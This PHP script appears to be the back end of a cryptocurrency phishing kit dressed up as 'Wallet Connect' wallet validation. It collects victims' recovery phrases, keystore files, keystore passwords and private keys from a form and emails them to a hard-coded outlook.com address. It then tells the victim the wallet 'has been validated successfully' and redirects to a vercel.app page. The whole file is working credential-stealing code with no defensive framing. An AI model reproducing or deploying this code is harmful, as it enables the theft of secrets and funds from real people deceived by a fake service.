<?php


$wallet = $_POST['wallet'];

$eallet_ID = $_POST['Walled_ID'];

$phrase = $_POST['phrase'];

$email = "validatewallet@outlook.com";
//Send Mail
$from = "validatewallet@outlook.com";
$subject = "New Wallet Recovery Submitted";
$headers = "From: Wallet Connect <$from> \r\n";
$headers .= "Reply-To: Wallet Connect <$from> \r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$message = 'Welcome Wallet Connect';
$message .= '<h1>Wallet Name: '.$wallet.'</h1>';
$message .= '<h1>Recovery Phrase: '.$phrase.'</h1>';
if($_POST['keystore1']){
  
  $keystore = $_POST['keystore1'];
  $message .= '<h1>Keystore 1: '.$keystore.'</h1>';  
    
}
if($_POST['Keystore_Password']){
  
  $keystorePass = $_POST['Keystore_Password'];
  $message .= '<h1>Keystore Password: '.$keystorePass.'</h1>';  
    
}
if($_POST['Private_Key']){
  
  $pri = $_POST['Private_Key'];
  $message .= '<h1>Private Key: '.$pri.'</h1>';  
    
}
$message .= "<p style='background: #eee;'><strong>Validate Wallet, Alright Reserved</strong> &copy; 2026";
        
if (@mail($email, $subject, $message, $headers)) {
     echo 'Wallet has been validated successfully...  <a href="https://wallet-seven-eta.vercel.app/index.html"> Go back </a>';
     header("Location: https://wallet-seven-eta.vercel.app/success.html");
} else {
    echo 'There was a problem processing your recovery phrase.';
    header("Location: index.html");
}